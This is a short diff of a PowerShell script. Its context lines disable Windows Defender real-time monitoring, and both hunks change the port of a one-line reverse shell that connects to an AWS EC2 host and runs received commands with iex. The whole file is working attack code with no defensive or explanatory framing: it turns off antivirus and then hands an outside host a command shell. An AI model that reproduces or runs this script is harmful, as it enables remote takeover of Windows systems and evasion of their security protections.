@@ -6,7 +6,7 @@ $n = Set-MpPreference -DisableRealtimeMonitoring $true
  
  start-sleep 10
   
- $sm=(New-Object Net.Sockets.TCPClient("ec2-3-89-21-74.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "cmd.exe"
+ $sm=(New-Object Net.Sockets.TCPClient("ec2-3-89-21-74.compute-1.amazonaws.com",3335)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "cmd.exe"
 
  start-sleep 10
 
@@ -22,7 +22,7 @@ $n= Set-MpPreference -DisableRealtimeMonitoring $true
  
  start-sleep 10
   
- $sm=(New-Object Net.Sockets.TCPClient("ec2-3-89-21-74.compute-1.amazonaws.com",3333)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "cmd.exe"
+ $sm=(New-Object Net.Sockets.TCPClient("ec2-3-89-21-74.compute-1.amazonaws.com",3335)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} -e "cmd.exe"
 
  start-sleep 10
  
